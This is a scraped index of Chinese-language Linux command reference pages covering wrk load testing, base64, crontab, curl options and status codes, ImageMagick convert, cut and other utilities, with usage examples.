sudo apt-get install build-essential libssl-dev git -y\ngit clone https://github.com/wg/wrk.git wrk\ncd wrk\nmake\n# 将可执行文件移动到 /usr/local/bin 位置\nsudo cp wrk /usr/local/bin 对于RedHat: sudo yum groupinstall 'Development Tools'\nsudo yum install -y openssl-devel git\ngit clone https://github.com/wg/wrk.git wrk\ncd wrk\nmake\n# 将可执行文件移动到 /usr/local/bin 位置\nsudo cp wrk /usr/local/bin 对于MacOS: brew install wrk 对于Windows: Windown 10 需要在 Windows 功能 里勾选 适用于 Linux 的 Windows 子系统,\n然后通过 bash 命令切换到 Ubuntu 子系统。\n参考上面. 使用-语法 语法: wrk <选项> <被测HTTP服务的URL> Options: -c , --connections <N> 跟服务器建立并保持的TCP连接数量 -d , --duration <T> 压测时间 -t , --threads <N> 使用多少个线程进行压测 -s , --script <S> 指定Lua脚本路径 -H , --header <H> 为每一个HTTP请求添加HTTP头 --latency 在压测结束后，打印延迟统计信息 --timeout <T> 超时时间 -v , --version 打印正在使用的wrk的详细版本信息 <N>代表数字参数，支持国际单位 (1k, 1M, 1G)\n<T>代表时间参数，支持时间单位 (2s, 2m, 2h) 注解 关于线程数，并不是设置的越大，压测效果越好，线程设置过大，\n反而会导致线程切换过于频繁，效果降低，\n一般来说，推荐设置成压测机器 CPU 核心数的 2 倍到 4 倍就行了。 对 www.baidu.com 发起压力测试，\n线程数为 12，模拟 400 个并发请求，持续 30 秒: wrk -t12 -c400 -d30s http://www.baidu.com 测试报告 还是上面的对 www.baidu.com 发起压力测试，\n线程数为 12，模拟 400 个并发请求，持续 30 秒\n并打印延迟报告: $ wrk -t12 -c400 -d30s --latency http://www.baidu.com\nRunning 30s test @ http://www.baidu.com\n  12 threads and 400 connections (共12个测试线程，400个连接)\n                                (平均值)  (标准差)（最大值）(正负一个标准差所占比例)\n  Thread Stats   Avg      Stdev     Max   +/- Stdev\n    (延迟)\n    Latency     1.44s   483.77ms   2.00s    76.01%\n    (每秒请求数)\n    Req/Sec    14.70     11.35    90.00     74.57%\n  Latency Distribution (延迟分布)\n    50%    1.58s\n    75%    1.79s\n    90%    1.92s\n    99%    1.99s\n  3967 requests in 30.11s, 1.55GB read  (30.11s内处理了 3967 个请求，耗费流量1.55GB)\n  Socket errors: connect 158, read 0, write 0, timeout 1191 (发生错误数)\nRequests/sec:    131.77    (QPS 131.77,即平均每秒处理请求数为131.77)\nTransfer/sec:     52.60MB  (平均每秒流量52.60MB) 注解 标准差啥意思？标准差如果太大说明样本本身离散程度比较高，有可能系统性能波动较大。 复杂测试 通过编写 Lua 脚本的方式，在运行压测命令时，通过参数 --script 来指定 Lua 脚本 提供的函数 function setup(thread) setup 函数在目标 IP 地址已经解析完, 并且所有 thread 已经生成, 但是还没有开始时被调用. 每个线程执行一次这个函数. setup 方法中可操作该 thread 对象，获取信息、存储信息、甚至关闭该线程: thread.addr             - get or set the thread's server address\nthread:get(name)        - get the value of a global in the thread's env\nthread:set(name, value) - set the value of a global in the thread's env\nthread:stop()           - stop the thread function init(args) init 函数每次请求发送之前被调用.\n可以接受 wrk 命令行的额外参数. 通过 -- 指定. function delay() delay函数返回一个数值, 在这次请求执行完以后延迟多长时间执行下一个请求. 可以对应 thinking time 的场景. function request() request函数可以每次请求之前修改本次请求的属性. 返回一个字符串. 这个函数要慎用, 会影响测试端性能. function response(status, headers, body) response函数每次请求返回以后被调用. 可以根据响应内容做特殊处理, 比如遇到特殊响应停止执行测试, 或输出到控制台等等. function done(summary, latency, requests) done函数在所有请求执行完以后调用, 一般用于自定义统计结果. wrk官网提供的setup.lua实例: -- example script that demonstrates use of setup() to pass\n-- data to and from the threads\n\nlocal counter = 1\nlocal threads = {}\n\nfunction setup(thread)\n  thread:set(\"id\", counter)\n  table.insert(threads, thread)\n  counter = counter + 1\nend\n\nfunction init(args)\n  requests  = 0\n  responses = 0\n\n  local msg = \"thread %d created\"\n  print(msg:format(id))\nend\n\nfunction request()\n  requests = requests + 1\n  return wrk.request()\nend\n\nfunction response(status, headers, body)\n  responses = responses + 1\nend\n\nfunction done(summary, latency, requests)\n  for index, thread in ipairs(threads) do\n      local id        = thread:get(\"id\")\n      local requests  = thread:get(\"requests\")\n      local responses = thread:get(\"responses\")\n      local msg = \"thread %d made %d requests and got %d responses\"\n      print(msg:format(id, requests, responses))\n  end\nend 参考:: 性能测试工具 wrk 使用教程 HTTP压测工具之wrk","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-WRK.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-WRK.html"},{"title":"zenity","text":"Zenity是一个使用GTK+库开发的工具，用于创建图形用户界面（GUI）对话框(信息框) 一般 GNOME 桌面系统会预装. GNOME 是一个基于 GTK+ 的桌面环境.\n由于 zenity 与 GNOME 密切相关，因此大多数基于GNOME的Linux发行版，\n包括Ubuntu、Fedora和Debian等，都会默认安装Zenity。 安装: apt install zenity 常用选项: --info 信息框 --width <num> 弹出框宽度 --title <str> 标题 --text 主区域文本 --window-icon <icon_file> 设置窗体图标 如弹出宽500的信息框: zenity --info --title \"标题\" --text \"文本\" --width=500","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Zenity.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Zenity.html"},{"title":"asciinema","text":"与 script 类似 终端脚本录制工具, 支持多种方式安装, pip安装: pip install asciinema debian/ubuntu使用apt安装: apt install asciinema 终端执行的录制 开始录制: asciinema rec 然后像平常一样使用即可, 会自动被记录 结束录制(也可以不用 exit 而是直接 Ctrl+D ): exit 根据提示可选择上传或者保存到本地, 一般输出为 .cast 文件\n(貌似)","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-asciinema.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-asciinema.html"},{"title":"base64","text":"一些命令 从 file 中读取字符串然后编码: base64 file 将字符串 string+换行 编码为base64的字符串: echo \"string\" | base64 将字符串 string 编码为base64的字符串: echo -n \"string\" | base64 从指定的文件file中读取已经过base64编码的数据，然后进行解码: base64 -d file 对base64编码的字符串 str和空行 进行解码: echo \"str\" | base64 -d 对base64编码的字符串str进行解码: echo -n \"str\" | base64 -d 编/解码过程解析 例子: 转换前: 10101101,10111010,01110110 转换后: 00101011, 00011011 ,00101001 ,00110110 十进制: 43 27 41 54 对应码表中的值: r b p 2 所以上面的24位编码，编码后的Base64值为: rbp2 解码同理，把 rbq2 的二进制位连接上再重组得到三个8位值，得出原码。 （解码只是编码的逆过程，有关MIME的RFC还有很多，如果需要详细情况请自行查找。） 过程： 第一个字节，根据源字节的第一个字节处理。 规则：源第一字节右移两位，去掉低2位，高2位补零。 既：00 + 高6位 第二个字节，根据源字节的第一个字节和第二个字节联合处理。 规则如下，第一个字节高6位去掉然后左移四位，第二个字节右移四位 即：源第一字节低2位 + 源第2字节高4位 第三个字节，根据源字节的第二个字节和第三个字节联合处理， 规则第二个字节去掉高4位并左移两位（得高6位），第三个字节右移6位并去掉高6位（得低2位），相加即可 第四个字节，规则，源第三字节去掉高2位即可 用更接近于编程的思维来说，编码的过程是这样的： 第一个字符通过右移2位获得第一个目标字符的Base64表位置，根据这个数值取到表上相应的字符，就是第一个目标字符。 然后将第一个字符与0x03(00000011)进行与(&)操作并左移4位,接着第二个字符右移4位与前者相或(|)，即获得第二个目标字符。 再将第二个字符与0x0f(00001111)进行与(&)操作并左移2位,接着第三个字符右移6位与前者相或(|)，获得第三个目标字符。 最后将第三个字符与0x3f(00111111)进行与(&)操作即获得第四个目标字符。 在以上的每一个步骤之后，再把结果与 0x3F 进行 AND 位操作 ，\n就可以得到编码后的字符了。 原文的字节数量应该是3的倍数，如果这个条件不能满足的话，具体的解决办法是这样的：原文剩余的字节根据编码规则继续单独转(1变2，2变3；不够的位数用0补全)，再用=号补满4个字节。这就是为什么有些Base64编码会以一个或两个等号结束的原因，但等号最多只有两个。因为一个原字节至少会变成两个目标字节，所以余数任何情况下都只可能是0，1，2这三个数中的一个。如果余数是0的话，就表示原文字节数正好是3的倍数（最理想的情况）。如果是1的话，转成2个Base64编码字符，为了让Base64编码是4的倍数，就要补2个等号；同理，如果是2的话，就要补1个等号。 原理：三个字节的八个字符 = 四个字节的六个字符 （3*8=4*6） 流程： 1、将字符转为ascii 2、将ascii转为二进制 3、原有的三字节在这里以源一、二、三代表 转换后的第一个字节：00 + 源一的高六位字符 转换后的第二个字节：00 + 源一的低二位字符 + 源二的高四位字符 转换后的第三个字节：00 + 源二的低四位字符 + 源三的高二位字符 转换后的第四个字节：00 + 源三的低六位字符 4、转换的二进制转换为十进制，根据编码表编码 注意：转换后的编码默认每76个字符换行，若不需换行，shell中 base64 -w 0即可 常用: base64               #编码\nbase64 -w num        #指定以多少个字符换行，为0则并不换行\nbase64 -d            #解码 编码表 索引 对应字符 索引 对应字符 索引 对应字符 索引 对应字符 0 A 17 R 34 i 51 z 1 B 18 S 35 j 52 0 2 C 19 T 36 k 53 1 3 D 20 U 37 l 54 2 4 E 21 V 38 m 55 3 5 F 22 W 39 n 56 4 6 G 23 X 40 o 57 5 7 H 24 Y 41 p 58 6 8 I 25 Z 42 q 59 7 9 J 26 a 43 r 60 8 10 K 27 b 44 s 61 9 11 L 28 c 45 t 62 12 M 29 d 46 u 63 / 13 N 30 e 47 v 14 O 31 f 48 w 15 P 32 g 49 x 16 Q 33 h 50 y","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-base64.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-base64.html"},{"title":"bash","text":"-n 仅语法检查 -v 执行前，先将内容输出（详细输出执行过程） -x 将使用的脚本内容显示到屏幕 -c <command> 以非交互方式执行给定的命令, 即将内容作为脚本执行, 支持换行的文本 -e 如果命令返回非零退出状态，则立即退出脚本 -a 将命令添加到历史记录中，而不执行 -f 禁用文件名扩展（通配符） -i 交互式运行Shell -r 禁用反斜杠转义 -s 从标准输入读取命令而不从终端读取","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-bash.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-bash.html"},{"title":"bg","text":"让前台任务在后台执行. 使用 jobs 查看后台运行的进程,\n使第N个任务在后台运行（%前有空格）: bg %N 默认不带%N时表示对最后一个进程操作！","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-but.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-but.html"},{"title":"bzip2","text":"解压缩,\n扩展名一般用.gz2 语法参数基本与 gzip 一致 注解 tar命令中增加一个选项(-j)可以调用bzip2","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-bzip2.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-bzip2.html"},{"title":"cal","text":"查看当前日历, 默认只显示当前月份 -y 显示完整一年","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-cal.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-cal.html"},{"title":"chkconfig","text":"chkconfig是管理系统服务(service)的命令行工具。\n所谓系统服务(service)，就是随系统启动而启动，随系统关闭而关闭的程序。 chkconfig可以更新(启动或停止)和查询系统服务(service)运行级信息。\n更简单一点，chkconfig是一个用于维护/etc/rc[0-6].d目录的命令行工具。 常见用法 用法: chkconfig [--list] [--type <类型>] [名称]\n        chkconfig --add <名称>\n        chkconfig --del <名称>\n        chkconfig --override <名称>\n        chkconfig [--level <级别>] [--type <类型>] <名称> <on|off|reset|resetpriorities> 设置service开机是否启动: chkconfig name on/off/reset on、off、reset用于改变service的启动信息.\non表示开启，off表示关闭，reset表示重置。\n默认情况下，on和off开关只对运行级2，3，4，5有效，reset可以对所有运行级有效。 注解 在Redhat7上，运行chkconfig命令，都会被转到systemcle命令上。 设置service运行级别: chkconfig --level levels 指定服务的运行级别，即指定运行级别2,3,4,5等(即 init 的运行级别): 0：- 关机 1：单用户模式 2：无网络连接的多用户命令行模式 3：有网络连接的多用户命令行模式 4：不可用 5：带图形界面的多用户模式 6：重新启动 列出service启动信息: chkconfig --list [name] 如果不指定name，会列出所有services的信息. 每个service每个运行级别都会有一个启动和停止脚本；\n当切换运行级别时，init不会重启已经启动的service，也不会重新停止已经停止的service。 欲查看对特定 target 启用的服务请执行: systemctl list-dependencies [target]","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-chkconfig.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-chkconfig.html"},{"title":"clear","text":"清屏 也可使用快捷键：Ctrl + l","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-clear.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-clear.html"},{"title":"convert","text":"转换图片格式，支持JPG, BMP, PCX, GIF, PNG, TIFF, XPM和XWD等类型 mac安装: brew install imagemagick 获取图片尺寸: identify ABCD.png 输出: ABCD.png PNG 339x362 339x362+0+0 8-bit DirectClass 76.2kb 说明：图片ABCD.png的格式为PNG，宽、高分别为339和362，位深度8-bit，大小76.2kb；下文主要涉及宽、高的信息。 将jpeg转成png文件: convert  xxx.jpg  xxx.png 将gif转换成bmp图像: convert  xxx.gif   xxx.bmp 将tiff转换成pcx图像: convert  xxx.tiff    xxx.pcx 将图像的像素改为1024*768，注意1024与768之间是小写字母x: convert -resize 1024x768  xxx.jpg   xxx1.jpg 将图像的缩减为原来的50%*50%: convert -sample 50%x50%  xxx.jpg  xxx1.jpg 将图像顺时针旋转270度: convert -rotate 270 sky.jpg sky-final.jpg 使用-draw选项还可以在图像里面添加文字: convert -fill black -pointsize 60 -font helvetica -draw 'text 10,80 \"Hello, World!\" ‘  hello.jpg  helloworld.jpg 在图像上加上文字说明, 比如版权: # 支持用 -font 指定字体，需要安装Ghostscript支持: http://www.cs.wisc.edu/~ghost/\n# 或者用 composite 命令在所有图片上加上水印: http://www.imagemagick.org/script/composite.php\nconvert 1.png -fill white -pointsize 13 -draw \"text 10,15 ‘lifesinger 2006＇\" 2.png 参考:: Linux之convert命令 巧用linux工具之convert简介","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-convert.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-convert.html"},{"title":"crond","text":"crontab服务 Linux下的任务调度分为两类： 系统任务调度 和 用户任务调度 系统任务调度 系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。\n在 /etc 目录下有一个 crontab 文件，这个就是系统任务调度的配置文件。 /etc/crontab 文件包括下面几行: SHELL=/bin/bash\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=\"\"HOME=/\n\n# run-parts\n51 * * * * root run-parts /etc/cron.hourly\n24 7 * * * root run-parts /etc/cron.daily\n22 4 * * 0 root run-parts /etc/cron.weekly\n42 4 1 * * root run-parts /etc/cron.monthly 前四行是用来配置crond任务运行的环境变量 第一行SHELL变量指定了系统要使用哪个shell，这里是bash 第二行PATH变量指定了系统执行命令的路径 第三行MAILTO变量指定了crond的任务执行信息将通过电子邮件发送给root用户，\n如果MAILTO变量的值为空，则表示不发送任务执行信息给用户， 第四行的HOME变量指定了在执行命令或者脚本时使用的主目录。 用户任务调度 用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。\n用户可以使用 crontab 工具来定制自己的计划任务。\n所有用户定义的crontab文件都被保存在 /var/spool/cron 目录中。\n其文件名与用户名一致，使用者权限文件如下: /etc/cron.deny     该文件中所列用户不允许使用crontab命令\n/etc/cron.allow    该文件中所列用户允许使用crontab命令\n/var/spool/cron/   所有用户crontab文件存放的目录,以用户名命名 crontab文件的含义 用户所建立的crontab文件中，每一行都代表一项任务，每行的每个字段代表一项设置，它\n的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下: minute   hour   day   month   week   command     顺序：分 时 日 月 周 其中： minute： 表示分钟，可以是从0到59之间的任何整数。 hour：表示小时，可以是从0到23之间的任何整数。 day：表示日期，可以是从1到31之间的任何整数。 month：表示月份，可以是从1到12之间的任何整数。 week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。 command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。 在以上各个字段中，还可以使用以下特殊字符： 星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。 逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，\"1,2,5,7,8,9\" 中杠（-）：可以用整数之间的中杠表示一个整数范围，例如\"2-6\"表示\"2,3,4,5,6\" 正斜线（/）：可以用正斜线指定时间的间隔频率，例如\"0-23/2\"表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。 crond服务-指令 常用: /sbin/service crond start    # 启动服务\n/sbin/service crond stop     # 关闭服务\n/sbin/service crond restart  # 重启服务\n/sbin/service crond reload   # 重新载入配置 查看crontab服务状态: service crond status 手动启动crontab服务: service crond start 查看crontab服务是否已设置为开机启动，执行命令: ntsysv 加入开机自动启动: chkconfig –level 35 crond on centos版本适用 cron表达式中问号(?)的使用 cron表达式详解其中问号 ? 只能用在 DayofMonth 和 DayofWeek 两个域，\n由于指定日期( DayofMonth )和指定星期( DayofWeek )存在冲突，\n所以当指定了日期( DayofMonth )后（包括每天），星期( DayofWeek )必须使用 ? ，\n同理，指定星期( DayofWeek )后，日期( DayofMonth )必须使用问号 ? .","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-crond.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-crond.html"},{"title":"curl","text":"curl 是常用的命令行工具，用来请求 Web 服务器。\n它的名字就是客户端（client）的 URL 工具的意思。 它的功能非常强大，命令行参数多达几十种。如果熟练的话，完全可以取代 Postman 这一类的图形界面工具。 不带有任何参数时，curl 就是发出 GET 请求: $ curl https://www.example.com -A -A 参数指定客户端的用户代理标头，即 User-Agent .\ncurl 的默认用户代理字符串是 curl/[version] 将 User-Agent 改成 Chrome 浏览器: $ curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' https://google.com 移除 User-Agent 标头: $ curl -A '' https://google.com 也可以通过 -H 参数直接指定标头，更改 User-Agent : $ curl -H 'User-Agent: php/1.0' https://google.com -b -b 参数用来向服务器发送 Cookie 生成一个标头`Cookie: foo=bar`，向服务器发送一个名为`foo`、值为`bar`的 Cookie: $ curl -b 'foo=bar' https://google.com 发送两个 Cookie: $ curl -b 'foo1=bar;foo2=bar2' https://google.com 读取本地文件`cookies.txt`，里面是服务器设置的 Cookie（参见`-c`参数），将其发送到服务器: $ curl -b cookies.txt https://www.google.com -c -c 参数将服务器设置的 Cookie 写入一个文件。 将服务器的 HTTP 回应所设置 Cookie 写入文本文件 cookies.txt : $ curl -c cookies.txt https://www.google.com -d -d 参数用于发送 POST 请求的数据体 使用`-d`参数以后，HTTP 请求会自动加上标头 Content-Type : application/x-www-form-urlencoded 。\n并且会自动将请求转为 POST 方法，因此可以省略 -X POST : $ curl -d'login=emma＆password=123'-X POST https://google.com/login\n# 或者\n$ curl -d 'login=emma' -d 'password=123' -X POST  https://google.com/login -d 参数可以读取本地文本文件的数据，向服务器发送.\n如读取`data.txt`文件的内容，作为数据体向服务器发送: $ curl -d '@data.txt' https://google.com/login --data-urlencode --data-urlencode 参数等同于 -d ，发送 POST 请求的数据体，\n区别在于会自动将发送的数据进行 URL 编码。 发送的数据 hello world 之间有一个空格，需要进行 URL 编码: $ curl --data-urlencode 'comment=hello world' https://google.com/login -e 设置 HTTP 的标头 Referer ，表示请求的来源。 将`Referer`标头设为 https://google.com?q=example : curl -e 'https://google.com?q=example' https://www.example.com -H`参数可以通过直接添加标头`Referer ，达到同样效果: curl -H 'Referer: https://google.com?q=example' https://www.example.com -F 向服务器上传二进制文件 给 HTTP 请求加上标头`Content-Type: multipart/form-data`，然后将文件`photo.png`作为`file`字段上传: $ curl -F 'file=@photo.png' https://google.com/profile -F 参数可以指定 MIME 类型。\n如指定 MIME 类型为`image/png`，否则 curl 会把 MIME 类型设为 application/octet-stream : $ curl -F 'file=@photo.png;type=image/png' https://google.com/profile -F`参数也可以指定文件名。\n如原始文件名为`photo.png ，但是服务器接收到的文件名为 me.png : $ curl -F 'file=@photo.png;filename=me.png' https://google.com/profile -G 构造 URL 的查询字符串。 发出一个 GET 请求，实际请求的 URL 为`https://google.com/search?q=kitties&count=20`。如果省略`--G`，会发出一个 POST 请求: $ curl -G -d 'q=kitties' -d 'count=20' https://google.com/search 如果数据需要 URL 编码，可以结合 --data--urlencode 参数: $ curl -G --data-urlencode 'comment=hello world' https://www.example.com -H 添加 HTTP 请求的标头。\n添加 HTTP 标头 Accept-Language: en-US : $ curl -H 'Accept-Language: en-US' https://google.com 添加两个 HTTP 标头: $ curl -H 'Accept-Language: en-US' -H 'Secret-Message: xyzzy' https://google.com 添加 HTTP 请求的标头是 Content-Type: application/json ，然后用`-d`参数发送 JSON 数据: $ curl -d '{\"login\": \"emma\", \"pass\": \"123\"}' -H 'Content-Type: application/json' https://google.com/login -i 打印出服务器回应的 HTTP 标头 收到服务器回应后，先输出服务器回应的标头，然后空一行，再输出网页的源码: $ curl -i https://www.example.com -I 向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来。 输出服务器对 HEAD 请求的回应: $ curl -I https://www.example.com --head`参数等同于 `-I : $ curl --head https://www.example.com -k 指定跳过 SSL 检测。 不会检查服务器的 SSL 证书是否正确: $ curl -k https://www.example.com -L 让 HTTP 请求跟随服务器的重定向。\ncurl 默认不跟随重定向: $ curl -L -d 'tweet=hi' https://api.twitter.com/tweet --limit-rate --limit-rate 限制 HTTP 请求和回应的带宽，模拟慢网速的环境 将带宽限制在每秒 200K 字节: $ curl --limit-rate 200k https://google.com -o -o 参数将服务器的回应保存成文件，等同于 wget 命令 将 www.example.com 保存成 example.html : $ curl -o example.html https://www.example.com -O -O 参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。 将服务器回应保存成文件，文件名为 bar.html : $ curl -O https://www.example.com/foo/bar.html -s -s 参数将不输出错误和进度信息 一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果: $ curl -s https://www.example.com 如果想让 curl 不产生任何输出，可以使用下面的命令: $ curl -s -o /dev/null https://google.com -S -S`参数指定只输出错误信息，通常与 `-s 一起使用。 命令没有任何输出，除非发生错误: $ curl -s -o /dev/null https://google.com -u 设置服务器认证的用户名和密码。 设置用户名为 bob ，密码为 12345 ， 然后将其转为 HTTP 标头 Authorization: Basic Ym9iOjEyMzQ1 : $ curl -u 'bob:12345' https://google.com/login curl 能够识别 URL 里面的用户名和密码, 将其转为上个例子里面的 HTTP 标头: $ curl https://bob:12345@google.com/login 只设置了用户名，执行后，curl 会提示用户输入密码: $ curl -u 'bob' https://google.com/login -v 输出通信的整个过程，用于调试: $ curl -v https://www.example.com --trace 参数也可以用于调试，还会输出原始的二进制数据: $ curl --trace - https://www.example.com -x -x 参数指定 HTTP 请求的代理。 指定 HTTP 请求通过 myproxy.com:8080 的 socks5 代理发出: $ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com 如果没有指定代理协议，默认为 HTTP。 请求的代理使用 HTTP 协议: $ curl -x james:cats@myproxy.com:8080 https://www.example.com -X -X 参数指定 HTTP 请求的方法。 对 https://www.example.com 发出 POST 请求: $ curl -X POST https://www.example.com CURL状态码列表 状态码 状态原因 解释 0 正常访问 1 错误的协议 未支持的协议。此版cURL 不支持这一协议。 2 初始化代码失败 初始化失败。 3 URL格式不正确 URL 格式错误。语法不正确。 4 请求协议错误 5 无法解析代理 无法解析代理。无法解析给定代理主机。 6 无法解析主机地址 无法解析主机。无法解析给定的远程主机。 7 无法连接到主机 无法连接到主机。 8 远程服务器不可用 FTP 非正常的服务器应答。cURL 无法解析服务器发送的数据。 9 访问资源错误 FTP 访问被拒绝。服务器拒绝登入或无法获取您想要的特定资源或目录。最有可 能的是您试图进入一个在此服务器上不存在的目录。 11 FTP密码错误 FTP 非正常的PASS 回复。cURL 无法解析发送到PASS 请求的应答。 13 结果错误 FTP 非正常的的PASV 应答，cURL 无法解析发送到PASV 请求的应答。 14 FTP回应PASV命令 FTP 非正常的227格式。cURL 无法解析服务器发送的227行。 15 内部故障 FTP 无法连接到主机。无法解析在227行中获取的主机IP。 17 设置传输模式为二进制 FTP 无法设定为二进制传输。无法改变传输方式到二进制。 18 文件传输短或大于预期 部分文件。只有部分文件被传输。 19 RETR命令传输完成 FTP 不能下载/访问给定的文件， RETR (或类似)命令失败。 21 命令成功完成 FTP quote 错误。quote 命令从服务器返回错误。 22 返回正常 HTTP 找不到网页。找不到所请求的URL 或返回另一个HTTP 400或以上错误。 此返回代码只出现在使用了-f/--fail 选项以后。 23 数据写入失败 写入错误。cURL 无法向本地文件系统或类似目的写入数据。 25 无法启动上传 FTP 无法STOR 文件。服务器拒绝了用于FTP 上传的STOR 操作。 26 回调错误 读错误。各类读取问题。 27 内存分配请求失败 内存不足。内存分配请求失败。 28 访问超时 操作超时。到达指定的超时期限条件。 30 FTP端口错误 FTP PORT 失败。PORT 命令失败。并非所有的FTP 服务器支持PORT 命令，请 尝试使用被动(PASV)传输代替！ 31 FTP错误 FTP 无法使用REST 命令。REST 命令失败。此命令用来恢复的FTP 传输。 33 不支持请求 HTTP range 错误。range \"命令\"不起作用。 34 内部发生错误 HTTP POST 错误。内部POST 请求产生错误。 35 SSL/TLS握手失败 SSL 连接错误。SSL 握手失败。 36 下载无法恢复 FTP 续传损坏。不能继续早些时候被中止的下载。 37 文件权限错误 文件无法读取。无法打开文件。权限问题？ 38 LDAP可没有约束力 LDAP 无法绑定。LDAP 绑定(bind)操作失败。 39 LDAP搜索失败 LDAP 搜索失败。 41 函数没有找到 功能无法找到。无法找到必要的LDAP 功能。 42 中止的回调 由回调终止。应用程序告知cURL 终止运作。 43 内部错误 内部错误。由一个不正确参数调用了功能。 45 接口错误 接口错误。指定的外发接口无法使用。 47 过多的重定向 过多的重定向。cURL 达到了跟随重定向设定的最大限额跟 48 无法识别选项 指定了未知TELNET 选项。 49 TELNET格式错误 不合式的telnet 选项。 51 远程服务器的SSL证书 peer 的SSL 证书或SSH 的MD5指纹没有确定。 52 服务器无返回内容 服务器无任何应答，该情况在此处被认为是一个错误。 53 加密引擎未找到 找不到SSL 加密引擎。 54 设定默认SSL加密失败 无法将SSL 加密引擎设置为默认。 55 无法发送网络数据 发送网络数据失败。 56 衰竭接收网络数据 在接收网络数据时失败。 57 58 本地客户端证书 本地证书有问题。 59 无法使用密码 无法使用指定的SSL 密码。 60 凭证无法验证 peer 证书无法被已知的CA 证书验证。 61 无法识别的传输编码 无法辨识的传输编码。 62 无效的LDAP URL 无效的LDAP URL。 63 文件超过最大大小 超过最大文件尺寸。 64 FTP失败 要求的FTP 的SSL 水平失败。 65 倒带操作失败 发送此数据需要的回卷(rewind)失败。 66 SSL引擎失败 初始化SSL 引擎失败。 67 服务器拒绝登录 用户名、密码或类似的信息未被接受，cURL 登录失败。 68 未找到文件 在TFTP 服务器上找不到文件。 69 无权限 TFTP 服务器权限有问题。 70 超出服务器磁盘空间 TFTP 服务器磁盘空间不足。 71 非法TFTP操作 非法的TFTP 操作。 72 未知TFTP传输的ID 未知TFTP 传输编号(ID)。 73 文件已经存在 文件已存在(TFTP) 。 74 错误TFTP服务器 无此用户(TFTP) 。 75 字符转换失败 字符转换失败。 76 必须记录回调 需要字符转换功能。 77 CA证书权限 读SSL 证书出现问题(路径？访问权限？ ) 。 78 URL中引用资源不存在 URL 中引用的资源不存在。 79 错误发生在SSH会话 SSH 会话期间发生一个未知错误。 80 无法关闭SSL连接 未能关闭SSL 连接。 81 服务未准备 82 无法载入CRL文件 无法加载CRL 文件，丢失或格式不正确(在7.19.0版中增加) 。 83 发行人检查失败 签发检查失败(在7.19.0版中增加) 。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-curl.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-curl.html"},{"title":"cut","text":"显示行中的指定部分，删除文件中指定字段。 语法: cut（选项）（参数） 选项 -b 仅显示行中指定直接范围的 字节 内容； -c 仅显示行中指定范围的 字符 ； -d 指定字段的分隔符，默认的字段分隔符为\"TAB\"； -f 显示指定 字段 （指定列）的内容； -n 与\"-b\"选项连用，不分割多字节字符； --complement 补足被选择的字节、字符或字段； --out-delimiter= <字段分隔符> 指定输出内容是的字段分割符； 字节字符如何写参数 N-：从第N个字节、字符、字段到结尾； N-M：从第N个字节、字符、字段到第M个（包括M在内）字节、字符、字段； -M：从第1个字节、字符、字段到第M个（包括M在内）字节、字符、字段。 例-从文件中提取第三列并打印: cut -f3 file.txt 支持多列, 如第3, 4列打印: cut -f3,4 file.txt cut命令默认使用制表符作为字段分隔符。\n如果您的数据使用其他分隔符，例如逗号或空格，您可以使用 -d 选项指定分隔符。\n例如，对于以逗号分隔的数据，您可以使用以下命令: cut -d',' -f3 file.csv 注解 在MacOS上(其他系统不确定), 对于连续空格识别有点问题, 如: echo \"mysql                    <none>             57da161f45ac   12 months ago   517MB\" | cut -f3 的结果是打印整个行; 而: echo \"mysql                    <none>             57da161f45ac   12 months ago   517MB\" | cut -d ' ' -f3 的输出是空; 只有这样的才能正常处理: $ echo \"mysql <none> 57da161f45ac 12 months ago 517MB\" | cut -d ' ' -f3\n57da161f45ac 不知道是不是tab识别有问题...","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-cut.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-cut.html"},{"title":"dpkg-deb","text":"dpkg-deb 提供了完整的 deb 包创建和操作功能,\n提供打包、解包、查询 deb 信息等功能\n是 deb 包管理不可或缺的工具 常见用法和选项包括: 解包 deb: dpkg-deb -x package.deb unpack/ :解压 deb 到指定目录\ndpkg-deb -R package.deb unpack/ :递归解压 deb 